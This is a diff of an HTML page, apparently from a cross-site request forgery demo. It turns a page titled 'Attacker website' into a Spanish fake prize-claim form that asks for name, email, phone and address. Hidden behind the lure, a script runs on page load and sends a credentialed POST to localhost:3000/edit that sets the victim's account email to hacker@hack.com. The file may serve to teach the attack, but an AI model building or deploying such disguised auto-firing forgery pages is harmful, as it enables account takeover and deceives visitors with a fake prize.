@@ -1,39 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Attacker website</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Reclamo de Premio</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <div>
-    <h1>
-      Some nice website
-    </h1>
-    <!-- <form name="form" action="http://localhost:3000/edit" method="POST">
-      <input type="hidden" name="email" value="hacker@hack.com">
-    </form> -->
-  </div>
-  <script>
-    //document.form.submit();
+    <div class="container">
+        <form id="prizeForm">
+            <h1>¡Felicidades! Reclama tu Premio</h1>
+            <label for="name">Nombre Completo</label>
+            <input type="text" id="name" name="name" required>
 
-    fetch('http://localhost:3000/edit', {
-      method: 'POST',
-      credentials: 'include',
-      mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-      body: 'email=hacker@hack.com',
-    })
-      .then(res => console.log(res.status))
-      .catch(err => console.log(err));
+            <label for="email">Correo Electrónico</label>
+            <input type="email" id="email" name="email" required>
 
-    // fetch('http://localhost:3000/edit', { credentials: 'include' })
-    //   .then(res => res.text())
-    //   .then(html => console.log(html))
-    //   .catch(err => console.log(err));
-  </script>
+            <label for="phone">Número de Teléfono</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <label for="address">Dirección</label>
+            <textarea id="address" name="address" required></textarea>
+
+            <label for="prize">Premio Ganado</label>
+            <select id="prize" name="prize" required>
+                <option value="viaje">Viaje</option>
+                <option value="dinero">Dinero en efectivo</option>
+                <option value="producto">Producto</option>
+                <option value="otro">Otro</option>
+            </select>
+
+            <button type="submit">Enviar</button>
+        </form>
+        <div id="confirmationMessage" style="display: none;">
+            <h2>¡Gracias por enviar el formulario!</h2>
+            <p>Tu solicitud ha sido recibida correctamente. Nos pondremos en contacto contigo pronto.</p>
+        </div>
+    </div>
+    <script>
+        fetch('http://localhost:3000/edit', {
+        method: 'POST',
+        credentials: 'include',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'email=hacker@hack.com',
+        })
+        .then(res => console.log(res.status))
+        .catch(err => console.log(err));
+        document.getElementById('prizeForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevenir el envío del formulario
+            document.getElementById('prizeForm').style.display = 'none'; // Ocultar el formulario
+            document.getElementById('confirmationMessage').style.display = 'block'; // Mostrar el mensaje de confirmación
+        });
+    </script>
 </body>
 </html>
